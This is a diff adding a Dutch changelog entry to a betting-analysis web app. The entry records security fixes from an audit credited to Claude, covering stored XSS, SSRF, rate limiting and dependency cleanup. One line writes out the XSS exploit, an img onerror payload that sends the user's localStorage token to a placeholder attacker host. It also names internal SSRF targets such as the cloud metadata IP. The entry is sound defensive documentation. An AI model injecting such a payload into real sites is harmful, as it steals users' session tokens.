@@ -2,6 +2,36 @@
 
 Alle noemenswaardige wijzigingen aan EdgePickr. Formaat: [Keep a Changelog](https://keepachangelog.com/nl/1.1.0/), nieuwste eerst.
 
+## [10.12.1] - 2026-04-17
+
+Security batch — Claude deep-review findings P0 + P1 uit 2026-04-17 audit doorgevoerd. Geen breaking changes; gedrag strakker, attack surface kleiner.
+
+### Security (P0)
+- **[claude] Stored XSS in check-results render gesloten** (`index.html:4117-4121`). Velden `r.wedstrijd`, `r.markt`, `r.note`, `r.score` waren rechtstreeks in innerHTML geinterpoleerd. Exploit: bet aanmaken met `wedstrijd="A<img src=x onerror=fetch('//atk/?t='+localStorage.ep_token)>"`, Check Results triggert → JWT exfil. Fix: `escHtml()` (bestaande helper, escaped ook quotes) op alle vier velden. Zelfde fix op `loadSupabaseUsage()` `d.note` + `d.dashboardUrl` voor forward-compat.
+- **[claude] Blind SSRF via push-endpoint gesloten** (`server.js:362`). Voorheen werd `sub.endpoint` rauw naar `webpush.sendNotification` doorgestuurd → auth'd user kon interne IPs (169.254.169.254, localhost:6379, …) registreren; server POSTte blind. Fix: `isAllowedPushEndpoint()` whitelist op FCM / Mozilla autopush / Apple / WNS hosts, HTTPS-only, 2000-byte endpoint cap, 4000-byte totale subscription cap.
+
+### Security (P1)
+- **[claude] `app.set('trust proxy', 1)`** (`server.js:278`). Zonder dit was `req.ip` altijd Render's proxy-loopback → alle auth'd users deelden één rate-limit-bucket → één attacker DoS'te iedereen. Nu: echte client-IP achter Render's edge.
+- **[claude] Composite rate-limit keys op login/register/2FA** (`server.js:6367, 6397, 6419`). Key is nu `"<route>:<ip>:<email>"` i.p.v. alleen IP → shared-NAT (kantoor, mobiele carrier) users kunnen elkaar niet DoS'en.
+- **[claude] Rate-limits op schrijf-endpoints** (`POST/PUT/DELETE /api/bets` 60/min, `PUT /api/auth/password` 5/min, `POST /api/analyze` 10/min, `POST /api/prematch` 5/min). Voorkomt: bets-tabel spam-fill, bcrypt-CPU-DoS via loop-change, memory-DoS via scan-history re-parsing, denial-of-wallet op api-football paid quota.
+- **[claude] Constant-time compare op 2FA code** (`server.js:6404`). `crypto.timingSafeEqual` i.p.v. `!==`. Over WAN onrealistisch, hardening is gratis.
+- **[claude] Sport-whitelist op `PUT /api/bets/:id`** (`server.js:8155`). Voorheen accepteerde arbitraire `sport` string → vervuilde `normalizeSport()` + calibration-buckets. Nu: whitelist `football/basketball/hockey/baseball/american-football/handball`.
+- **[claude] Query-lengte cap op `/api/analyze`** (500 chars). Bounds ReDoS-input voor natural-language regex-parsers in analyser.
+
+### Security (P1/P2 dependency)
+- **[claude] `xlsx@0.18.5` dependency verwijderd**. Pakket was declared maar nergens `require`d; had 2 HIGH CVEs (GHSA-4r6h-8v6p-xvw6 prototype pollution, GHSA-5pgg-2g8v-p4x9 ReDoS). `npm audit`: 1 high → 0 vulnerabilities.
+
+### Security (P2 hardening)
+- **[claude] Stack trace niet meer in `/api/debug/odds` response** (`server.js:8527`). Was admin-only dus lage reach, maar fail-closed is principe.
+- **[claude] Unused `get(url)` helper verwijderd** (`server.js:1292`). Dode code met fetch-primitive zonder SSRF-guard.
+
+### Rationale
+Deze findings kwamen uit de parallelle 6-stream deep-audit (auth, authz, injection, SSRF, secrets, DoS). Niks hiervan was een live exploit in productie — de XSS vereist dat de attacker al auth is (low external reach), de SSRF is blind (geen response-exfil), de rate-limit gaps vereisen eveneens auth. Dichtzetten nu voorkomt escalatie als andere vectors later opengaan.
+
+### Tests
+- `npm test` groen: 469 passed, 0 failed.
+- `npm audit`: 0 vulnerabilities.
+
 ## [10.12.0] - 2026-04-17
 
 **Telegram volledig verwijderd** — operator-alerts lopen nu alleen via Web Push (VAPID) + Supabase `notifications` inbox. Bart gebruikt uitsluitend de PWA; Telegram was dead weight én een extra secret-rotation oppervlak.
